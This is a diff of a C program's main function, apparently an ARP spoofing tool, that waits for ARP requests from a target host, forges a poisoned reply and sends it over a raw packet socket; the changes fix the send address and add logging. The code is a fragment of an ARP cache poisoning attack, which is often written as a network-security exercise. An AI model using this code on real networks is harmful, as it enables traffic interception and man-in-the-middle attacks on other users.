@@ -42,14 +42,14 @@ int main(int argc, char **argv)
 	signal_handling();
 	init_checks(argc, argv, &data);
 	choose_socket_type(&data);
-	printf("%d\n", g_packet_socket);
+	(void)((data.opt & VERBOSE) && getHost(&data));
 	interface(&data);
 	get_link_layer_addr(&data, ether_broadcast_addr, &addr);
     printf("Using interface: %s of index: %d\n", data.interface, addr.sll_ifindex);
 	if (BONUS == TRUE && (data.opt & REQUEST))
 	{
 		build_arp_request(&data, &req);
-		printf("\nSending ARP request to poison target...\n\n");
+		printf("\nARPing request to poison target..., ctrl+C to interrupt\n\n");
 		(void)((data.opt & VERBOSE) && print_data(&req, NULL));
 	}
 	else
@@ -74,19 +74,20 @@ int main(int argc, char **argv)
 			t_arp_packet *arp_request = (t_arp_packet *)(buffer + ETHER_HDR_LEN);
 			if (ntohs(arp_request->arp_opcode) == ARPOP_REQUEST
 				&& arp_request->arp_spa == data.target.sin_addr.s_addr
-				&& (arp_request->arp_dpa & data.source.sin_addr.s_addr))
+				&& (arp_request->arp_dpa & data.source.sin_addr.s_addr) == arp_request->arp_dpa)
 			{
 				printf("ARP request received\n");
 				printf(YELLOW"Who has %s ?", inet_ntoa(data.source.sin_addr));
 				printf(" tell %s\n"RESET, inet_ntoa(data.target.sin_addr));
 				(void)((data.opt & VERBOSE) && print_data(arp_request, eth_hdr));
 				poison(&data, arp_request, eth_hdr);
-				if (sendto(g_packet_socket, &buffer, sizeof(buffer), 0, (struct sockaddr *)&data.target.sin_addr, sizeof(data.target.sin_addr)) == -1)
+				sleep(1);
+				if (sendto(g_packet_socket, &buffer, sizeof(buffer), 0, (struct sockaddr *)&addr, addr_len) == -1)
 					error("sendto() failed", errno, TRUE);
+				printf(YELLOW"Reply sent\n"RESET);
+				(void)((data.opt & VERBOSE) && print_data(arp_request, eth_hdr));
 				break ;
 			}
-			else
-				continue ;
 		}
 	}
 	if (close(g_packet_socket) == -1)
